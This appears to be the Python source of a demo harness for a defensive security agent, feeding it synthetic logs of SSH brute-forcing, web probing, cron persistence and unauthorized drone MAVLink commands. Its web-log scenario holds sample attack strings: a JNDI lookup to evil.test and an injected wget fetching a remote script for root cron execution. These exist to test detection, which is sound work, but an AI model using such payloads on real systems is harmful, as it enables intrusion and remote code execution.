from __future__ import annotations

import json
import shutil
import time
from pathlib import Path
from urllib.parse import quote
from typing import Any, Dict, List

import yaml

from aegis_agent.core.loop_controller import LoopController
from aegis_agent.core.proof import ProofReportGenerator
from aegis_agent.utils import ensure_dir


class AIDuelDemoHarness:
    """Safe AI-vs-defense duel demo harness.

    This never runs exploits or brute-force tools. It writes controlled synthetic
    telemetry/log events to a temporary directory and asks Aegis to defend them.
    It is intended for competition proof, screenshots, and rehearsal.
    """

    def __init__(self, base_config: str, base_policy: str, output_dir: str, execute: bool = False, use_config_ai: bool = False):
        self.base_config = Path(base_config)
        self.base_policy = Path(base_policy)
        self.output_dir = Path(output_dir)
        self.execute = bool(execute)
        self.use_config_ai = bool(use_config_ai)
        ensure_dir(self.output_dir)
        self.telemetry_dir = self.output_dir / "telemetry"
        ensure_dir(self.telemetry_dir)
        self.reports_dir = self.output_dir / "reports"
        ensure_dir(self.reports_dir)
        self.audit_db = self.output_dir / "audit.db"
        self.state_dir = self.output_dir / "state"
        self.ledger_path = self.output_dir / "ai_reasoning_ledger.jsonl"
        self.runtime_dir = self.output_dir / "runtime"
        self.runtime_tmp_dir = self.runtime_dir / "tmp"
        self.runtime_cron_dir = self.runtime_dir / "etc" / "cron.d"
        self.quarantine_dir = self.output_dir / "quarantine"
        self.persistence_backup_dir = self.output_dir / "persistence_backup"

    def _write(self, name: str, text: str, mode: str = "a") -> Path:
        p = self.telemetry_dir / name
        ensure_dir(p.parent)
        with p.open(mode, encoding="utf-8") as f:
            f.write(text)
        return p

    def _clear_inputs(self, names: list[str]) -> None:
        for name in names:
            (self.telemetry_dir / name).write_text("", encoding="utf-8")

    def _clear_after_cycle(self, label: str) -> None:
        if label == "ssh_bruteforce":
            self._clear_inputs(["auth.log"])
        elif label == "vulnerability_payload_mutation":
            self._clear_inputs(["access.log", "network.txt", "file_events.log", "persistence.log", "processes.txt"])
        elif label == "drone_mavlink_unauthorized_command":
            self._clear_inputs(["drone_mavlink.log"])

    def _build_config(self) -> Dict[str, Any]:
        cfg = yaml.safe_load(self.base_config.read_text(encoding="utf-8")) if self.base_config.exists() else {}
        cfg.setdefault("agent", {})
        cfg["agent"].update({"id": "aegis-ai-duel-demo", "audit_db": str(self.audit_db), "state_dir": str(self.state_dir), "loop_interval_seconds": 1, "max_iterations": 1})
        cfg.setdefault("telemetry", {})
        cfg["telemetry"].update({
            "auth_logs": [str(self.telemetry_dir / "auth.log")],
            "web_logs": [str(self.telemetry_dir / "access.log")],
            "app_logs": [],
            "auditd_logs": [str(self.telemetry_dir / "audit.log")],
            "file_events": str(self.telemetry_dir / "file_events.log"),
            "persistence_events": str(self.telemetry_dir / "persistence.log"),
            "process_snapshot": str(self.telemetry_dir / "processes.txt"),
            "network_snapshot": str(self.telemetry_dir / "network.txt"),
            "time_window_minutes": 0,
            "ignore_time_window_for_sample_data": True,
            "realtime": {"enabled": False, "tail_first_run": "full"},
            "fim": {"enabled": False},
        })
        cfg.setdefault("drone", {})
        cfg["drone"].update({
            "enabled": True,
            "collect_live_ss": False,
            "logs": [str(self.telemetry_dir / "drone_mavlink.log")],
            "allowed_gcs_ips": ["192.168.13.10"],
            "allowed_drone_ips": ["192.168.13.20"],
            "allowed_sysids": [1],
            "mavlink_ports": [14550, 14551, 5760],
            "ros2_dds_ports": [7400, 7401, 11811],
        })
        if not self.use_config_ai:
            cfg.setdefault("ai", {})
            cfg["ai"].update({"provider": "rule_based", "provider_priority": ["rule_based"], "model": "local-rule-engine", "fallback_to_rule_based": True})
        cfg.setdefault("enforcement", {})
        # The default demo backend is memory so the demo is safe everywhere.
        # When --execute is used, network actions are still memory-only, while
        # file/persistence actions operate on demo-owned files under output_dir.
        cfg["enforcement"].update({
            "dry_run": not self.execute,
            "require_cli_enable_flag": False,
            "require_root": False,
            "prefer_backend": "memory",
            "action_ttl_seconds_default": 3600,
            "quarantine_dir": str(self.quarantine_dir),
            "persistence_backup_dir": str(self.persistence_backup_dir),
            "persistence_allowed_paths": [str(self.runtime_cron_dir), str(self.runtime_dir / "etc" / "systemd" / "system"), str(self.runtime_dir / "home")],
        })
        cfg.setdefault("central", {})["enabled"] = False
        cfg.setdefault("reasoning_ledger", {})
        cfg["reasoning_ledger"].update({"enabled": True, "path": str(self.ledger_path), "max_chain_events": 200})
        cfg.setdefault("signature_patterns", {}).update({"enabled": True, "load_defaults": True})
        cfg.setdefault("vulnerability_guard", {}).update({"enabled": True, "aggregate_threshold": 3, "aggregate_min_events": 3})
        cfg.setdefault("loop_process", {})["enabled"] = True
        return cfg

    def _build_policy(self) -> Dict[str, Any]:
        policy = yaml.safe_load(self.base_policy.read_text(encoding="utf-8")) if self.base_policy.exists() else {}
        policy.setdefault("policy", {})
        p = policy["policy"]
        p.setdefault("evidence", {})["min_events_for_response"] = 1
        p.setdefault("allowlists", {}).update({"ips": ["127.0.0.1", "::1"], "cidrs": [], "process_names": ["systemd", "sshd"], "accounts": ["root"]})
        actions = p.setdefault("actions", {})
        for name, min_score in [("block_ip_ttl", 50), ("rate_limit_ip", 45), ("block_outbound_ip", 70), ("quarantine_file", 75), ("disable_persistence", 85)]:
            actions.setdefault(name, {})
            actions[name].update({"enabled": True, "auto_allowed": True, "min_score": min_score, "ttl_required": name in {"block_ip_ttl", "rate_limit_ip", "block_outbound_ip"}, "rollback_required": True})
        for name in ["suspend_process", "kill_process", "restrict_account", "isolate_host"]:
            actions.setdefault(name, {})
            actions[name].update({"enabled": False, "auto_allowed": False})
        return policy

    def _scenario_ssh(self) -> None:
        lines = []
        for i in range(12):
            lines.append(f"Jul 07 10:00:{i:02d} demo sshd[1234]: Failed password for invalid user attacker from 198.51.100.99 port 55{i:03d} ssh2\n")
        self._write("auth.log", "".join(lines))

    def _scenario_vuln_mutation(self) -> None:
        # Use demo-owned real paths so --execute can prove quarantine and
        # persistence rollback without touching /tmp or /etc on the host.
        ensure_dir(self.runtime_tmp_dir)
        ensure_dir(self.runtime_cron_dir)
        file_target = self.runtime_tmp_dir / ".x"
        persistence_target = self.runtime_cron_dir / "aegis-demo"
        if not file_target.exists():
            file_target.write_text("#!/bin/sh\necho aegis-demo-payload\n", encoding="utf-8")
            file_target.chmod(0o755)
        persistence_target.write_text(f"* * * * * root {file_target}\n", encoding="utf-8")

        encoded_file_target = quote(str(file_target), safe="/")
        lines = [
            '198.51.100.77 - - [07/Jul/2026:10:01:00 +0900] "GET /.env HTTP/1.1" 404 0 "-" "ai-prober"\n',
            '198.51.100.77 - - [07/Jul/2026:10:01:01 +0900] "GET /.git/config HTTP/1.1" 404 0 "-" "ai-prober"\n',
            '198.51.100.77 - - [07/Jul/2026:10:01:02 +0900] "GET /?q=${jndi:ldap://evil.test/a} HTTP/1.1" 400 0 "-" "ai-prober"\n',
            f'198.51.100.77 - - [07/Jul/2026:10:01:03 +0900] "GET /index.php?cmd=wget%20http://45.77.1.2/x.sh%20-O%20{encoded_file_target} HTTP/1.1" 400 0 "-" "ai-prober"\n',
        ]
        self._write("access.log", "".join(lines))
        self._write("network.txt", "tcp ESTAB 0 0 192.0.2.10:44222 45.77.1.2:443 users:((\"sh\",pid=3333,fd=3))\n", mode="w")
        self._write("file_events.log", f"{file_target} CREATE mode=755 sha256=demo\n", mode="w")
        self._write("persistence.log", f"{persistence_target} {file_target}\n", mode="w")
        self._write("processes.txt", f"3333 2222 www-data sh wget http://45.77.1.2/x.sh -O {file_target}\n", mode="w")

    def _scenario_drone(self) -> None:
        self._write("drone_mavlink.log", "".join([
            "SRC=198.51.100.88 DST=192.168.13.20 DPT=14550 MAVLINK MSG=COMMAND_LONG SYSID=255 COMPID=1\n",
            "SRC=198.51.100.88 DST=192.168.13.20 DPT=14550 MAVLINK MSG=PARAM_SET SYSID=255 COMPID=1\n",
            "SRC=198.51.100.88 DST=192.168.13.20 DPT=14550 MAVLINK MSG=MISSION_WRITE_PARTIAL_LIST SYSID=255 COMPID=1\n",
        ]))

    def _write_narrative(self, cycle: int, label: str, incidents: List[Dict[str, Any]]) -> None:
        rec = {
            "cycle": cycle,
            "scenario": label,
            "incident_count": len(incidents),
            "incidents": [
                {
                    "incident_id": i.get("incident_id"),
                    "attack_type": i.get("attack_type"),
                    "score": i.get("score"),
                    "actions": [a.get("action") for a in i.get("actions", [])],
                }
                for i in incidents
            ],
        }
        p = self.output_dir / "duel_timeline.jsonl"
        with p.open("a", encoding="utf-8") as f:
            f.write(json.dumps(rec, ensure_ascii=False, sort_keys=True) + "\n")

    def run(self) -> Dict[str, Any]:
        cfg = self._build_config()
        policy = self._build_policy()
        cfg_path = self.output_dir / "agent_duel.yaml"
        pol_path = self.output_dir / "policy_duel.yaml"
        cfg_path.write_text(yaml.safe_dump(cfg, sort_keys=False, allow_unicode=True), encoding="utf-8")
        pol_path.write_text(yaml.safe_dump(policy, sort_keys=False, allow_unicode=True), encoding="utf-8")

        # Ensure files exist.
        for name in ["auth.log", "access.log", "audit.log", "file_events.log", "persistence.log", "processes.txt", "network.txt", "drone_mavlink.log"]:
            (self.telemetry_dir / name).touch(exist_ok=True)

        controller = LoopController(cfg, policy, enable_enforcement=self.execute)
        summary = {"cycles": [], "output_dir": str(self.output_dir), "execute": self.execute}
        scenarios = [
            ("ssh_bruteforce", self._scenario_ssh),
            ("vulnerability_payload_mutation", self._scenario_vuln_mutation),
            ("drone_mavlink_unauthorized_command", self._scenario_drone),
        ]
        for idx, (label, fn) in enumerate(scenarios, start=1):
            fn()
            incidents = controller.run_once()
            self._write_narrative(idx, label, incidents)
            summary["cycles"].append({"cycle": idx, "scenario": label, "incident_count": len(incidents)})
            # Avoid re-processing the same synthetic telemetry in later cycles.
            # Audit DB and the reasoning ledger keep the evidence proof.
            self._clear_after_cycle(label)

        proof = ProofReportGenerator(str(self.audit_db), str(self.ledger_path)).write(str(self.reports_dir), title="Aegis AI Duel Demo Proof Report")
        summary["proof"] = proof
        (self.output_dir / "duel_summary.json").write_text(json.dumps(summary, indent=2, ensure_ascii=False), encoding="utf-8")
        return summary
